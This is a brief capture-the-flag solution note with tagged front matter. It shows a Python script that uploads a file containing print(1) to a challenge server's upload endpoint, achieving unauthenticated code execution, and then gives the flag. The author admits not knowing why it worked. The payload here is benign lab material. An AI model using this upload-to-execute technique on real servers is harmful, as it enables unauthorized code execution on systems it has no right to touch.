---
ai_date: 2025-04-27 05:13:32
ai_summary: Executed code in the server without authentication
ai_tags:
  - xss
  - exec
  - payload
created: 2024-08-08T08:22
points: 225
updated: 2025-07-14T09:46
---

Honestly IDK how tf I solved this.

Was just testing the endpoint.

```python
from io import BytesIO
import requests

payload = b"""
print(1)
""".strip()

print(requests.post('https://bugcrowd-i-am-watching-you.chals.io/upload', files={'file1': BytesIO(payload)}).text)
```

```flag
flag{the_magic_word}
```